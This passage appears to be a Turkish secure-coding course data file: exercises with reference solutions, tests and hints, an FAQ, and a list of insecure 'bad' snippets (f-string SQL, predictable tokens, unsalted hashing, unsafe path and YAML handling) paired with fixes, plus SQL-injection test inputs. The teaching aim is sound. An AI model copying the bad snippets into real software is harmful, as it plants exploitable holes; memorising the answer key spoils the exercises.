assert log_temizle("telefon 05321234567") == "telefon ***********", "11 haneli her numara TC gibi maskelenir (temkinli davranış)"
''',
  'hints': ['Her kural için ayrı derlenmiş regex; sırayla uygula.', 'Kart için (?<!\\d)(?:\\d[ -]?){12,18}\\d(?!\\d) kalıbı boşluk/tire içeren 13-19 rakamı yakalar; eşleşmeden rakamları re.sub(r"\\D", "", ...) ile çıkar.', 'TC kuralını kart kuralından önce uygula ki bitişik 11 rakam karta dönüşmesin; ya da tersi için sınırları dikkatle kur.'],
  'why': 'Gizli bilgi maskelemesi log toplayıcıya gönderilmeden önce, uygulamanın içinde yapılmalıdır; log sistemleri genellikle geniş bir ekibe açıktır. Temkinli (fazla maskeleyen) kural, eksik maskeleyen kuraldan iyidir.'},
 {'id': 'web-guvenlik-13', 't': 'code', 'stage': 'Mini proje', 'diff': 3,
  'q': '<p>Ilgaz Bank için güvenli bir <code>KullaniciServisi(db)</code> sınıfı yaz. Tablo hazır: <code>kullanici(ad TEXT PRIMARY KEY, kayit TEXT, hatali INTEGER)</code>.</p><ul><li><code>kaydol(ad, parola)</code>: <code>ad</code> 3-20 karakter, yalnız küçük harf, rakam ve alt çizgi (<code>^[a-z0-9_]{3,20}$</code>); parola en az 10 karakter, en az bir harf ve bir rakam içermeli. Kural ihlalinde <code>ValueError</code>. Ad zaten varsa <code>ValueError("kayıtlı")</code>. Parolayı <code>pbkdf2_sha256$tur$tuz$ozet</code> biçiminde (tur = <code>self.tur</code>, varsayılan 5000) sakla.</li><li><code>giris(ad, parola)</code>: başarılıysa <code>True</code> ve hatalı sayacını sıfırlar; yanlış parolada sayacı artırıp <code>False</code>. Sayaç 3\'e ulaşmış hesap <b>kilitlidir</b>: doğru parolada bile <code>False</code>. Olmayan kullanıcıda <code>False</code>.</li><li><code>kilit_ac(ad)</code>: sayacı sıfırlar.</li></ul><p>Tüm SQL parametreli olsun; karşılaştırmada <code>hmac.compare_digest</code> kullan.</p>',
  'start': r'''import sqlite3, hashlib, hmac, secrets, re

def yeni_db():
    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE kullanici (ad TEXT PRIMARY KEY, kayit TEXT, hatali INTEGER)")
    return db

class KullaniciServisi:
    def __init__(self, db, tur=5000):
        self.db = db
        self.tur = tur

    # TODO: kaydol, giris, kilit_ac
''',
  'sol': r'''import sqlite3, hashlib, hmac, secrets, re

def yeni_db():
    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE kullanici (ad TEXT PRIMARY KEY, kayit TEXT, hatali INTEGER)")
    return db

AD_KALIBI = re.compile(r"^[a-z0-9_]{3,20}$")
KILIT_ESIGI = 3

class KullaniciServisi:
    def __init__(self, db, tur=5000):
        self.db = db
        self.tur = tur

    def _ozetle(self, parola, tuz, tur):
        return hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, tur)

    def kaydol(self, ad, parola):
        if not AD_KALIBI.fullmatch(ad):
            raise ValueError("geçersiz kullanıcı adı")
        if len(parola) < 10 or not re.search(r"[^\W\d_]", parola) or not re.search(r"\d", parola):
            raise ValueError("zayıf parola")
        if self.db.execute("SELECT 1 FROM kullanici WHERE ad = ?", (ad,)).fetchone():
            raise ValueError("kayıtlı")
        tuz = secrets.token_bytes(16)
        ozet = self._ozetle(parola, tuz, self.tur)
        kayit = f"pbkdf2_sha256${self.tur}${tuz.hex()}${ozet.hex()}"
        self.db.execute("INSERT INTO kullanici VALUES (?, ?, 0)", (ad, kayit))

    def giris(self, ad, parola):
        satir = self.db.execute("SELECT kayit, hatali FROM kullanici WHERE ad = ?", (ad,)).fetchone()
        if satir is None:
            return False
        kayit, hatali = satir
        if hatali >= KILIT_ESIGI:
            return False
        _, tur, tuz_hex, ozet_hex = kayit.split("$")
        aday = self._ozetle(parola, bytes.fromhex(tuz_hex), int(tur))
        if hmac.compare_digest(aday.hex(), ozet_hex):
            self.db.execute("UPDATE kullanici SET hatali = 0 WHERE ad = ?", (ad,))
            return True
        self.db.execute("UPDATE kullanici SET hatali = hatali + 1 WHERE ad = ?", (ad,))
        return False

    def kilit_ac(self, ad):
        self.db.execute("UPDATE kullanici SET hatali = 0 WHERE ad = ?", (ad,))
''',
  'tests': r'''db = yeni_db()
s = KullaniciServisi(db)
s.kaydol("ayse_k", "Anadolu2025x")
kayit = db.execute("SELECT kayit FROM kullanici WHERE ad = \'ayse_k\'").fetchone()[0]
assert kayit.startswith("pbkdf2_sha256$5000$") and "Anadolu2025x" not in kayit, "parola özetlenmiş biçimde saklanmalı"
for ad, p in [("Ayse", "Anadolu2025x"), ("ay", "Anadolu2025x"), ("ali; --", "Anadolu2025x"), ("veli", "kisa1"), ("veli", "sadeceharfler"), ("veli", "1234567890")]:
    try:
        s.kaydol(ad, p)
        assert False, f"{ad!r}/{p!r} reddedilmeliydi"
    except ValueError:
        pass
try:
    s.kaydol("ayse_k", "BaskaParola99")
    assert False, "aynı ad ikinci kez kaydedilmemeli"
except ValueError as e:
    assert str(e) == "kayıtlı", "mevcut ad için ValueError(\'kayıtlı\')"
assert s.giris("ayse_k", "Anadolu2025x") is True, "doğru parola True"
assert s.giris("yok_boyle", "Anadolu2025x") is False, "olmayan kullanıcı False"
assert s.giris("ayse_k\' --", "x") is False, "enjeksiyon denemesi False"
assert [s.giris("ayse_k", "yanlis") for _ in range(3)] == [False] * 3, "yanlış parola False"
assert s.giris("ayse_k", "Anadolu2025x") is False, "3 hatalı denemeden sonra hesap kilitli: doğru parola da False"
s.kilit_ac("ayse_k")
assert s.giris("ayse_k", "Anadolu2025x") is True, "kilit açılınca giriş yapılabilmeli"
s.giris("ayse_k", "yanlis"); s.giris("ayse_k", "yanlis"); s.giris("ayse_k", "Anadolu2025x"); s.giris("ayse_k", "yanlis")
assert s.giris("ayse_k", "Anadolu2025x") is True, "başarılı giriş sayacı sıfırlamalı"
assert "compare_digest" in __source__, "hmac.compare_digest kullan"
''',
  'hints': ['Doğrulamaları sırayla yap: ad kalıbı (fullmatch), parola kuralları, sonra veritabanında var mı.', 'Kilit kontrolünü parola kontrolünden ÖNCE yap; böylece kilitli hesapta parola denemesi bilgi vermez.', 'Sayaç güncellemesini SQL\'de yap: UPDATE ... SET hatali = hatali + 1 WHERE ad = ?'],
  'why': 'Gerçek bir giriş servisi birkaç savunmayı birleştirir: izin listesiyle girdi doğrulama, parola politikası, tuzlu yavaş özet, parametreli sorgu, sabit zamanlı karşılaştırma ve kaba kuvvete karşı hesap kilitleme. Biri eksikse zincir zayıflar.'},
],
'faq': [
 {'q': 'ORM kullanıyorsam SQL enjeksiyonunu dert etmeli miyim?',
  'a': 'Normal ORM sorgularında (filter, select) değerler parametreyle gider ve güvendesin. Risk, raw(), text(), extra() gibi ham SQL kapılarında ve dinamik sütun/tablo adlarında başlar. Oralarda değer için parametre, tanımlayıcı için izin listesi kullan.'},
 {'q': 'Parolayı şifrelesem (AES) özetlemekten daha iyi olmaz mı?',
  'a': 'Hayır. Şifreleme geri çözülebilir; anahtar sızarsa tüm parolalar düz metne döner. Parola doğrulamak için geri çözmeye hiç gerek yok: aynı tuzla yeniden özetleyip karşılaştırırsın. Bu yüzden tek yönlü, yavaş, tuzlu özet kullanılır.'},
 {'q': 'JWT\'yi localStorage\'da mı, çerezde mi saklamalıyım?',
  'a': 'localStorage\'daki token, sayfada çalışan herhangi bir XSS betiği tarafından okunabilir. HttpOnly, Secure, SameSite işaretli çerez JavaScript\'ten okunamaz; ama bu kez CSRF korumasını düşünmen gerekir. Kurumsal web uygulamalarında genellikle HttpOnly çerez + CSRF token tercih edilir.'},
 {'q': 'Takma adlandırılmış veri hâlâ kişisel veri midir?',
  'a': 'Evet. Anahtar sende olduğu sürece kişiyle yeniden ilişkilendirilebilir; bu yüzden KVKK kapsamında kişisel veri sayılır ve korunur. Anonim veri ise hiçbir ek bilgiyle kişiye bağlanamayan veridir; genelleme, gürültü ekleme ve küçük grupları bastırma gibi ek teknikler gerektirir.'},
],
'mistakes': [
 {'why': 'f-string ile kurulan SQL, kullanıcının tırnak kapatıp kendi SQL\'ini çalıştırmasına izin verir.',
  'bad': 'db.execute(f"SELECT * FROM hesap WHERE no = \'{no}\'")',
  'good': 'db.execute("SELECT * FROM hesap WHERE no = ?", (no,))'},
 {'why': 'random tahmin edilebilir bir üreteçtir; güvenlik amaçlı token için secrets kullanılır.',
  'bad': 'import random\nkod = "".join(random.choice("0123456789") for _ in range(6))',
  'good': 'import secrets\nkod = "".join(secrets.choice("0123456789") for _ in range(6))\ntoken = secrets.token_urlsafe(32)'},
 {'why': 'Tek tur, tuzsuz SHA-256 çok hızlıdır ve aynı parolalar aynı özeti üretir; kaba kuvvete ve hazır tablolara açıktır.',
  'bad': 'ozet = hashlib.sha256(parola.encode()).hexdigest()',
  'good': 'tuz = secrets.token_bytes(16)\nozet = hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, 600_000)'},
 {'why': 'Metin olarak startswith, kök klasörle aynı önekle başlayan kardeş klasörleri ve .. ile çıkışları yakalamaz.',
  'bad': 'yol = os.path.join(KOK, ad)\nif yol.startswith(KOK):\n    return open(yol).read()',
  'good': 'yol = (KOK / ad).resolve()\nif yol.is_relative_to(KOK.resolve()):\n    return yol.read_text()'},
 {'why': 'yaml.load tam yükleyiciyle Python nesnesi kurabilir; dış kaynaklı YAML için safe_load kullanılır.',
  'bad': 'ayar = yaml.load(dosya.read(), Loader=yaml.Loader)',
  'good': 'ayar = yaml.safe_load(dosya.read())'},
],
}
